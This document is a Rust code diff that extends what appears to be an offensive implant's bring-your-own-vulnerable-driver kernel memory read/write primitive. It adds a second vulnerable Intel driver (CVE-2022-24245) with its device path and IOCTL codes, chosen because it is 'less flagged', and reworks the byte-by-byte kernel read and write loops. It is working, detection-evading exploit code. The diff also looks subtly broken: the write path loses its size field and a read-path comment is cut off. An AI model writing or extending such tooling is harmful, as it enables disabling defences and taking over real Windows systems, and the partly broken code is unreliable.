@@ -73,6 +73,9 @@ pub trait VulnDriverIoctl: Send + Sync {
     fn read_ioctl(&self) -> u32;
     /// IOCTL code for "write `size` bytes from `buf` to kernel VA `addr`".
     fn write_ioctl(&self) -> u32;
+    /// Offset of the address field in the per-driver MemoryOperation struct.
+    /// RTCore64 = 0x08, IQVW64E = 0x00.
+    fn addr_offset(&self) -> usize { 0x08 }
     /// Pack a read/write request into the driver's input buffer. Default uses
     /// the generic [`RwPacket`]; drivers with a different layout override.
     fn pack(&self, code: u32, addr: u64, buf: *mut u8, size: u32) -> [u8; 32] {
@@ -151,6 +154,27 @@ impl VulnDriverIoctl for RtCore64 {
     fn write_ioctl(&self) -> u32 {
         0x8000204C
     }
+}
+
+/// Alternative: Intel IQVW64E.sys (CVE-2022-24245). Less flagged than RTCore64.
+/// Device `\\.\iqvw64e`. Uses a different IOCTL protocol.
+///
+/// IOCTL read=0x80802010, write=0x80802014. Same MemoryOperation layout
+/// as RTCore64 (48 bytes), but address field at offset 0x00 instead of 0x08.
+pub struct Iqvw64e;
+
+impl VulnDriverIoctl for Iqvw64e {
+    fn device_path(&self) -> &[u16] {
+        static PATH: [u16; 11] = [
+            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
+            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
+            '6' as u16, '4' as u16, 'e' as u16,
+        ];
+        &PATH
+    }
+    fn addr_offset(&self) -> usize { 0x00 }
+    fn read_ioctl(&self) -> u32 { 0x80802010 }
+    fn write_ioctl(&self) -> u32 { 0x80802014 }
 }
 
 // ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------
@@ -269,12 +293,11 @@ impl KernelRw for ByovdDriver {
         // RTCore64 reads ≤4 bytes per IOCTL; we loop one byte at a time
         // (matches the reference MemoryAccessor::ReadMemory). Each call uses a
         // 48-byte MemoryOperation struct as BOTH in- and out-buffer (METHOD_
-        // BUFFERED): the driver writes the read value back into `data`.
         let ioctl = self.driver.read_ioctl();
         for (i, out_byte) in dst.iter_mut().enumerate() {
+            let ao = self.driver.addr_offset();
             let mut op = [0u8; 48];
-            // address @ 0x08
-            op[0x08..0x10].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
+            op[ao..ao+8].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
             // size @ 0x18 = 1 (read 1 byte)
             op[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes());
             let mut ret: u32 = 0;
@@ -308,8 +331,8 @@ impl KernelRw for ByovdDriver {
         let ioctl = self.driver.write_ioctl();
         for (i, &in_byte) in src.iter().enumerate() {
             let mut op = [0u8; 48];
-            op[0x08..0x10].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
-            op[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes()); // size = 1
+            let ao = self.driver.addr_offset();
+            op[ao..ao+8].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
             op[0x1C..0x20].copy_from_slice(&(in_byte as u32).to_le_bytes()); // data
             let mut ret: u32 = 0;
             let ok = unsafe {
